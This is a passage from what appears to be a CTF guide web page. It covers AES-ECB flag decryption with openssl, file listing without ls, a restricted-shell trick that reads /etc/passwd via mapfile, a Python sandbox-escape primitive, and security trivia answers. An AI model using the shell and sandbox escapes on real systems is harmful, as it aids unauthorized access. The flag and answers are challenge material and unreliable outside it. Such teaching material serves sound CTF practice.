+<pre><code>NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
+</code></pre>
+<pre><code>Decoded, it is a hash: `5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751`.
+
+If you can find an AES ECB key along with (usually represented in hex or another encoding), you can decipher like so:
+</code></pre>
+<pre><code>openssl enc -d -aes-256-ecb -in &lt;(printf %s '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p) -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077'
+MCA{I$love$bitcoin$so$much!}
+</code></pre>
+<ul>
+<li>
+<p>Missing <code>ls</code> or <code>dir</code> commands</p>
+<p>If you cannot run <code>ls</code> or <code>dir</code>, or <code>find</code> or <code>grep</code>, to list files you can use</p>
+</li>
+</ul>
+<pre><code>echo *
+echo /any/path/*
+</code></pre>
+<ul>
+<li>
+<p>restricted bash (<code>rbash</code>) read files</p>
+<p>If you are a restricted shell like <code>rbash</code> you can still read any file with some builtin commands like <code>mapfile</code>:</p>
+</li>
+</ul>
+<pre><code>mapfile -t  &lt; /etc/passwd
+printf &quot;$s\n&quot; &quot;${anything[@]}&quot;
+</code></pre>
+<h2 id="jail-breaks"><a class="header" href="#jail-breaks">Jail Breaks</a></h2>
+<p>Sometimes you're jailed in an environment where you can potentially execute code.</p>
+<ul>
+<li>Python 3
+<code>().__class__.__base__.__subclasses__()</code> - Gives access to <code>object</code> subclasses</li>
+</ul>
+<h2 id="trivia"><a class="header" href="#trivia">Trivia</a></h2>
+<ul>
+<li>Trivia Question: a reliable mechanism for websites to remember stateful information. Yummy!</li>
+</ul>
+<pre><code>Cookie
+</code></pre>
+<ul>
+<li>A group of binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation</li>
+</ul>
+<pre><code>base64
+</code></pre>
+<ul>
+<li>This CVE Proof of concept Shows NSA.gov playing &quot;Never Gonna Give You Up,&quot; by 1980s heart-throb Rick Astley.</li>
+</ul>
+<pre><code>CVE-2020-0601
+</code></pre>
+<ul>
+<li>The British used this machine to crack the German Enigma machine messages.</li>
+</ul>
+<pre><code>Bombe
+</code></pre>
+<ul>
+<li>What is the Windows LM hash for a blank password?</li>
+</ul>
+<pre><code>aad3b435b51404eeaad3b435b51404ee
+</code></pre>
+<ul>
+<li>for Windows LM hashing, after the password is split into two 7 character chunks, they are used as DES keys to encrypt what string?</li>
+</ul>
+<pre><code>KGS!@#$%
+</code></pre>
+<ul>
+<li>I am the person responsible for stopping one of the worst ransomware. Who am I?</li>
+</ul>
+<pre><code>MalwareTech
+</code></pre>
+<ul>
+<li>I am used by devices for sending error messages. Who am I?</li>
+</ul>
+<pre><code>ICMP
+</code></pre>
+<ul>
+<li>We are a CTF team which is open to everybody. Who are we?</li>
+</ul>
+<pre><code>OpenToAll - https://opentoallctf.github.io/
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../03-ctf/assembly-syscalls.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../03-ctf/ctflicense.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../03-ctf/assembly-syscalls.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="../03-ctf/ctflicense.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
